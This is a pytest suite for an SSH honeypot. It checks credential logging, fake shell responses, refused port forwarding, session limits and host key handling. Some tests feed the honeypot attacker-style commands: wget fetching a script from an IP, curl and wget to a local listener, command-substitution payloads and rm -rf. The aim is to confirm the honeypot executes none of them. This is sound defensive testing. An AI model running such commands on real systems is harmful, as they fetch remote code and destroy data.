"""The honeypot over real SSH connections on loopback."""

from __future__ import annotations

import asyncio
import json

import asyncssh
import pytest

from sshpot import server


async def test_logs_in_on_the_third_attempt_from_one_ip_and_records_every_try(make_pot):
    pot = await make_pot()
    for pw in ("one", "two"):
        with pytest.raises(asyncssh.PermissionDenied):
            await pot.connect("root", pw)
    async with await pot.connect("root", "three"):
        pass
    await pot.settle()
    auths = pot.events("auth")
    assert [(a["username"], a["password"], a["success"]) for a in auths] == [
        ("root", "one", False),
        ("root", "two", False),
        ("root", "three", True),
    ]
    assert all(a["src_ip"] == "127.0.0.1" and a["method"] == "password" for a in auths)


async def test_listed_credentials_are_accepted_immediately(make_pot):
    pot = await make_pot(accepted_credentials={("admin", "admin")}, accept_after=0)
    async with await pot.connect("admin", "admin"):
        pass
    with pytest.raises(asyncssh.PermissionDenied):
        await pot.connect("admin", "wrong")
    with pytest.raises(asyncssh.PermissionDenied):
        await pot.connect("root", "admin")


async def test_accept_after_zero_never_lets_unlisted_pairs_in(make_pot):
    pot = await make_pot(accept_after=0)
    for _ in range(6):
        with pytest.raises(asyncssh.PermissionDenied):
            await pot.connect("root", "x")


async def test_client_fingerprint_connect_and_disconnect_are_logged(make_pot):
    pot = await make_pot(accept_after=1)
    async with await pot.login():
        pass
    await pot.settle()
    (client,) = pot.events("client")
    assert client["client_version"].startswith("SSH-2.0-AsyncSSH")
    assert len(client["client_id"]) == 16 and client["cipher"] and client["compression"]
    (conn,) = pot.events("connect")
    (disc,) = pot.events("disconnect")
    assert conn["session"] == disc["session"] == client["session"]
    assert (
        disc["authenticated"] is True
        and disc["attempts"] == 1
        and disc["duration"] >= 0
    )
    assert pot.events("server_start")[0]["banner"].startswith("OpenSSH_8.9p1")


async def test_exec_commands_get_canned_answers_and_are_logged(make_pot):
    pot = await make_pot(accept_after=1)
    async with await pot.login() as conn:
        r = await conn.run("uname -a; whoami; wget http://203.0.113.9/x.sh")
    await pot.settle()
    assert "5.15.0-91-generic" in r.stdout and "root\n" in r.stdout
    assert "unable to resolve host address '203.0.113.9'" in r.stdout
    (cmd,) = pot.events("command")
    assert cmd["kind"] == "exec" and cmd["input"].startswith("uname -a;")
    assert cmd["urls"] == ["http://203.0.113.9/x.sh"] and cmd["ips"] == ["203.0.113.9"]
    assert cmd["channel"] == 1


async def test_interactive_shell_with_pty(make_pot):
    pot = await make_pot(accept_after=1)
    async with await pot.login("bob") as conn:
        async with conn.create_process(term_type="xterm") as proc:
            banner = await asyncio.wait_for(proc.stdout.readuntil("$ "), 5)
            assert "Ubuntu 22.04" in banner and banner.endswith("bob@srv04:~$ ")
            proc.stdin.write("cd /etc\n")
            await asyncio.wait_for(proc.stdout.readuntil("$ "), 5)
            proc.stdin.write("pwd\n")
            echoed = await asyncio.wait_for(proc.stdout.readuntil("$ "), 5)
            assert "/etc\r\n" in echoed and echoed.endswith("bob@srv04:/etc$ ")
            proc.stdin.write("exit\n")
            await asyncio.wait_for(proc.wait(), 5)
    await pot.settle()
    assert [c["input"] for c in pot.events("command")] == ["cd /etc", "pwd", "exit"]
    opened = pot.events("session_open")[0]
    assert opened["kind"] == "shell" and opened["term"] == "xterm"


async def test_each_channel_is_numbered_separately(make_pot):
    pot = await make_pot(accept_after=1)
    async with await pot.login() as conn:
        await conn.run("whoami")
        await conn.run("id")
    await pot.settle()
    assert [(c["channel"], c["input"]) for c in pot.events("command")] == [
        (1, "whoami"),
        (2, "id"),
    ]


async def test_public_keys_are_fingerprinted_and_never_trusted(make_pot):
    pot = await make_pot(accept_after=0)
    key = asyncssh.generate_private_key("ssh-ed25519")
    with pytest.raises(asyncssh.PermissionDenied):
        await asyncssh.connect(
            "127.0.0.1",
            pot.port,
            username="root",
            client_keys=[key],
            known_hosts=None,
            preferred_auth="publickey",
        )
    await pot.settle()
    (ev,) = pot.events("auth_pubkey")
    assert ev["fingerprint"] == key.get_fingerprint() and ev["success"] is False
    assert ev["key_type"] == "ssh-ed25519"


async def test_port_forwarding_is_refused_and_logged(make_pot):
    pot = await make_pot(accept_after=1)
    async with await pot.login() as conn:
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.open_connection("example.com", 80)
    await pot.settle()
    (ev,) = pot.events("forward_attempt")
    assert (ev["dest_host"], ev["dest_port"]) == ("example.com", 80)


async def test_commands_never_run_anything_or_dial_out(make_pot, tmp_path):
    """Run attacker-style commands, with a local listener standing in for 'the internet'."""
    dialed = []

    async def on_connect(reader, writer):
        dialed.append(1)
        writer.close()

    victim = await asyncio.start_server(on_connect, "127.0.0.1", 0)
    vport = victim.sockets[0].getsockname()[1]
    marker = tmp_path / "pwned"
    pot = await make_pot(accept_after=1)
    async with await pot.login() as conn:
        await conn.run(
            f"curl http://127.0.0.1:{vport}/x; wget http://127.0.0.1:{vport}/y"
        )
        await conn.run(
            f"touch {marker}; echo owned > {marker}; $(touch {marker}); `touch {marker}`"
        )
        await conn.run(f"rm -rf {tmp_path}; cat {tmp_path}/pot")
    victim.close()
    assert dialed == [] and not marker.exists() and tmp_path.exists()


async def test_session_limits_idle_timeout_and_max_commands(make_pot):
    pot = await make_pot(accept_after=1, idle_timeout=0.4, max_commands=3)
    async with await pot.login() as conn:
        async with conn.create_process(term_type="xterm") as proc:
            await asyncio.wait_for(proc.stdout.readuntil("# "), 5)
            await asyncio.wait_for(proc.wait(), 5)  # idle: server hangs up
    async with await pot.login() as conn:
        async with conn.create_process(term_type="xterm") as proc:
            await asyncio.wait_for(proc.stdout.readuntil("# "), 5)
            for _ in range(3):
                proc.stdin.write("id\n")
            await asyncio.wait_for(proc.wait(), 5)
    await pot.settle()
    reasons = [e["reason"] for e in pot.events("session_timeout")]
    assert reasons == ["idle", "max_commands"]


async def test_max_auth_attempts_closes_the_connection(make_pot):
    pot = await make_pot(accept_after=0, max_auth_attempts=2)
    with pytest.raises(asyncssh.Error):
        await asyncssh.connect(
            "127.0.0.1",
            pot.port,
            username="root",
            password="x",
            known_hosts=None,
            client_keys=None,
            preferred_auth="password,keyboard-interactive",
        )
    await pot.settle()
    assert len(pot.events("auth")) >= 1


async def test_max_connections_refuses_extras(make_pot):
    pot = await make_pot(accept_after=1, max_connections=1)
    first = await pot.login()
    with pytest.raises((asyncssh.Error, OSError)):
        await pot.connect("root", "x")
    first.close()
    await first.wait_closed()
    await pot.settle()
    assert pot.events("refused")[0]["reason"] == "max_connections"
    async with await pot.connect("root", "x"):  # capacity is released afterwards
        pass


async def test_quiet_loopback_logs_nothing_for_health_checks(make_pot):
    pot = await make_pot(accept_after=1, quiet_loopback=True)
    async with await pot.login() as conn:
        await conn.run("id")
    await pot.settle()
    assert [e["event"] for e in pot.events()] == ["server_start"]


async def test_host_key_is_persisted_and_reused(make_pot, tmp_path):
    pot = await make_pot()
    path = tmp_path / "hostkey"
    assert path.exists() and oct(path.stat().st_mode & 0o777) == "0o600"
    a = asyncssh.read_private_key(str(path)).get_fingerprint()
    pot.acceptor.close()
    pot2 = await make_pot()
    async with await pot2.login():
        pass
    assert asyncssh.read_private_key(str(path)).get_fingerprint() == a


async def test_unwritable_host_key_location_falls_back_to_memory(make_pot, tmp_path):
    blocked = tmp_path / "file"
    blocked.write_text("x")  # a file where a directory is needed
    pot = await make_pot(host_key=str(blocked / "key"), accept_after=1)
    async with await pot.login():
        pass
    assert pot.events("host_key_not_persisted")


async def test_huge_credentials_are_clipped_in_the_log(make_pot):
    pot = await make_pot(accept_after=0)
    with pytest.raises(asyncssh.PermissionDenied):
        await pot.connect("u" * 200, "p" * 5000)
    await pot.settle()
    (auth,) = pot.events("auth")
    assert len(auth["username"]) < 1100 and len(auth["password"]) < 1100


async def test_log_is_valid_jsonl_throughout(make_pot):
    pot = await make_pot(accept_after=1)
    async with await pot.login() as conn:
        await conn.run("echo 'quote\" and \\\\ and é'")
    await pot.settle()
    for line in open(pot.cfg.log_path):
        assert isinstance(json.loads(line), dict)


def test_ensure_host_key_helper_creates_then_loads(tmp_path):
    from sshpot.logs import JsonlLogger

    log = JsonlLogger(None)
    k1 = server.ensure_host_key(str(tmp_path / "k"), log)
    k2 = server.ensure_host_key(str(tmp_path / "k"), log)
    assert k1.get_fingerprint() == k2.get_fingerprint()
